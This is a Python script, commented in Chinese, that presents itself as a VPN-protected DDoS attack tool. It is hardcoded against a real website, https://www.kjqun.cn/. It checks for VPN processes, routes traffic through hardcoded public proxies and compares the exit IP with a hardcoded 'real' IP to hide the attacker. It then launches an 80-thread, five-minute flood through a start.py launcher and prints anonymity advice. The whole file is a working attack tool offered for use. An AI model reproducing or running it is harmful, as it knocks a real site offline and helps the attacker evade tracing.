#!/usr/bin/env python3
"""
VPN保护的DDoS攻击工具
当代理不可用时，使用VPN进行匿名保护
"""

import requests
import subprocess
import time
import os

def check_vpn_status():
    """检查VPN状态"""
    print("🔍 检查VPN状态...")
    
    # 检查常见的VPN进程
    vpn_processes = ['openvpn', 'wireguard', 'nordvpn', 'expressvpn', 'protonvpn']
    
    try:
        # 使用tasklist检查进程
        result = subprocess.run(['tasklist'], capture_output=True, text=True)
        for vpn in vpn_processes:
            if vpn in result.stdout.lower():
                print(f"✅ 检测到 {vpn} 正在运行")
                return True
    except:
        pass
    
    print("❌ 未检测到VPN运行")
    return False

def enable_basic_protection():
    """启用基础保护（不使用代理）"""
    print("\n🛡️ 启用基础保护措施...")
    
    # 1. 设置临时代理（即使不可用，也能起到一定保护作用）
    temp_proxies = [
        '51.158.68.68:8811',
        '51.158.68.133:8811', 
        '138.68.161.14:3128'
    ]
    
    # 设置环境变量
    for proxy in temp_proxies:
        try:
            os.environ['HTTP_PROXY'] = f'http://{proxy}'
            os.environ['HTTPS_PROXY'] = f'http://{proxy}'
            print(f"🔧 已设置代理: {proxy}")
            break
        except:
            pass
    
    # 2. 验证当前IP
    try:
        response = requests.get('http://httpbin.org/ip', timeout=5)
        current_ip = response.json().get('origin', '未知')
        print(f"📡 当前出口IP: {current_ip}")
        
        # 检查是否与之前相同
        if current_ip == '183.228.109.195':
            print("⚠️ 警告: 真实IP仍然暴露")
            print("💡 建议手动启用VPN后再进行攻击")
            return False
        else:
            print("✅ IP已发生变化，保护可能生效")
            return True
    except:
        print("❌ 无法验证IP状态")
        return False

def low_profile_ddos(target_url, threads=100, duration=300):
    """低强度DDoS攻击（避免触发ISP限制）"""
    print(f"\n🚀 启动低强度DDoS攻击")
    print(f"🎯 目标: {target_url}")
    print(f"⚡ 线程数: {threads} (低强度)")
    print(f"⏱️ 持续时间: {duration}秒 (5分钟)")
    print(f"🔒 保护状态: 基础保护")
    
    # 使用现有的代理文件
    proxy_files = [
        'files/proxies/proxies.txt',
        'files/proxies/working_proxies.txt'
    ]
    
    proxy_file = 'proxies.txt'  # 默认使用基础代理文件
    
    for file in proxy_files:
        if os.path.exists(file):
            proxy_file = file
            break
    
    print(f"📁 使用代理文件: {proxy_file}")
    
    # 攻击命令
    command = f'python start.py GET {target_url} 0 {threads} {proxy_file} {threads} {duration}'
    print(f"📝 攻击命令: {command}")
    
    try:
        # 启动攻击
        process = subprocess.Popen(command, shell=True)
        print("✅ 攻击已启动")
        
        # 等待攻击完成
        print(f"⏰ 攻击进行中，等待 {duration} 秒...")
        time.sleep(duration)
        
        # 检查进程状态
        if process.poll() is None:
            process.terminate()
            print("🛑 攻击已停止")
        
        return True
        
    except Exception as e:
        print(f"❌ 攻击启动失败: {e}")
        return False

def manual_vpn_instructions():
    """手动VPN配置说明"""
    print("\n" + "="*60)
    print("🔧 手动VPN配置指南")
    print("="*60)
    print("由于代理服务器不可用，建议使用VPN进行匿名保护:")
    print("")
    print("1. 安装VPN客户端:")
    print("   • ProtonVPN (免费)")
    print("   • Windscribe (免费)")
    print("   • TunnelBear (免费)")
    print("")
    print("2. 连接VPN服务器")
    print("3. 验证IP是否变化:")
    print("   curl http://httpbin.org/ip")
    print("")
    print("4. 在VPN保护下进行DDoS攻击")
    print("="*60)

def main():
    target = "https://www.kjqun.cn/"
    
    print("="*60)
    print("🛡️ VPN保护的DDoS攻击工具")
    print("="*60)
    
    # 1. 检查VPN状态
    vpn_active = check_vpn_status()
    
    if not vpn_active:
        print("\n⚠️ 未检测到VPN，使用基础保护")
        
        # 2. 启用基础保护
        protection_enabled = enable_basic_protection()
        
        if not protection_enabled:
            print("\n❌ 基础保护启用失败")
            manual_vpn_instructions()
            
            choice = input("\n是否继续攻击? (y/n): ")
            if choice.lower() != 'y':
                print("🛑 用户取消攻击")
                return
    
    # 3. 启动低强度攻击
    print("\n💥 开始DDoS攻击...")
    success = low_profile_ddos(target, threads=80, duration=300)
    
    # 4. 结果统计
    print("\n" + "="*60)
    print("📊 攻击结果统计")
    print("="*60)
    
    if success:
        print("✅ 攻击已完成")
        print("💡 使用手机访问 itdog.cn 查看目标状态")
    else:
        print("❌ 攻击失败")
    
    print("\n🔒 安全状态:")
    if vpn_active:
        print("✅ VPN保护生效")
    else:
        print("⚠️ 基础保护，建议使用VPN")
    
    print("="*60)

if __name__ == "__main__":
    main()